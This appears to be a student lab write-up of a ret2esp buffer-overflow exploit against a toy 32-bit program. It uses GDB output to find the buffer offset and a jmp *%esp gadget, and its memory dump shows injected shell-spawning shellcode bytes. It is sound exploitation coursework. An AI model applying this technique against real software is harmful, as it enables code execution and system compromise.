# Question 7: Rigel Write-up
## Main Idea
#### (A description of the vulnerability)
This code is vulnerable because it contains the address of ```jmp    *%esp``` inside the ```magic``` function which reveals the secret ingredient to ```ret2esp``` attack. 

Address space layout randomization (ASLR) is enabled, however, we were able to get around it with ```ret2esp``` attack.

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)
We first determined the address of ```buf``` (0xffe8d588) and the address of rip of ```orbit``` function (0xffe8d59c). This was done by invoking GDB and setting a breakpoint at line 13. 
```
(gdb) i f
Stack level 0, frame at 0xffe8d5a0:
 eip = 0x804922a in orbit (orbit.c:13); saved eip = 0x8049247
 called by frame at 0xffe8d5b0
 source language c.
 Arglist at 0xffe8d598, args:
 Locals at 0xffe8d598, Previous frame's sp is 0xffe8d5a0
 Saved registers:
  ebp at 0xffe8d598, eip at 0xffe8d59c
(gdb) x/16x buf
0xffe8d588:     0x00000000      0x00000000      0x00000000      0x00000000
0xffe8d598:     0xffe8d5a8      0x08049247      0x00000001      0x0804923c
0xffe8d5a8:     0xffe8d62c      0x08049415      0x00000001      0xffe8d624
0xffe8d5b8:     0xffe8d62c      0x0804a000      0x00000000      0x00000000
```
ASLR randomizes the addresses, however, the relative distance between the rip of ```orbit``` function and ```buf``` stays the same. By finding out the addresses, we learned that ```buf``` is 20 bytes below rip of ```orbit``` (0xffe8d59c - 0xffe8d588 = 14 in hex = 20 in decimal).

We then determined the address of ```jmp *%esp``` (0x080491fd). This was done through invoking GDB and using gdb command ```disas```.
```
(gdb) disas magic
Dump of assembler code for function magic:
   0x080491e5 <+0>:     push   %ebp
   0x080491e6 <+1>:     mov    %esp,%ebp
   0x080491e8 <+3>:     mov    0xc(%ebp),%eax
   0x080491eb <+6>:     shl    $0x3,%eax
   0x080491ee <+9>:     xor    %eax,0x8(%ebp)
   0x080491f1 <+12>:    mov    0x8(%ebp),%eax
   0x080491f4 <+15>:    shl    $0x3,%eax
   0x080491f7 <+18>:    xor    %eax,0xc(%ebp)
   0x080491fa <+21>:    orl    $0xe4ff,0x8(%ebp)
   0x08049201 <+28>:    mov    0xc(%ebp),%ecx
   0x08049204 <+31>:    mov    $0x3e0f83e1,%edx
   0x08049209 <+36>:    mov    %ecx,%eax
   0x0804920b <+38>:    mul    %edx
   0x0804920d <+40>:    mov    %edx,%eax
   0x0804920f <+42>:    shr    $0x4,%eax
   0x08049212 <+45>:    imul   $0x42,%eax,%edx
   0x08049215 <+48>:    mov    %ecx,%eax
   0x08049217 <+50>:    sub    %edx,%eax
   0x08049219 <+52>:    mov    %eax,0xc(%ebp)
   0x0804921c <+55>:    mov    0x8(%ebp),%eax
   0x0804921f <+58>:    and    0xc(%ebp),%eax
   0x08049222 <+61>:    pop    %ebp
   0x08049223 <+62>:    ret
End of assembler dump.
(gdb) x/i 0x080491fd
   0x80491fd <magic+24>:        jmp    *%esp
```

## Exploit Structure
#### (A description of your exploit structure)
This exploit has three parts:
1. Write 20 bytes of dummy characters to overwrite the ```buf```, compiler padding and sfp of ```orbit```.
2. Overwrite the rip of ```orbit``` with the address of ```jmp    *%esp```. This will direct the program to the esp which moves to address right after the rip of ```orbit```. 
3. Insert the shellcode right after the rip of ```orbit```.
This causes the shellcode to run after it returns from the ```orbit``` function.

## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)
When we ran GDB after inputting the malicious exploit string, we got the following output:
```
(gdb) x/16x buf
0xffa308c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffa308d8:     0x41414141      0x080491fd      0xcd58326a      0x89c38980
0xffa308e8:     0x58476ac1      0xc03180cd      0x2f2f6850      0x2f686873
0xffa308f8:     0x546e6962      0x8953505b      0xb0d231e1      0x0080cd0b
```
After 20 bytes of garbage is the address of ```jmp    *%esp``` instruction which directs the program to esp where our shellcode is inserted. 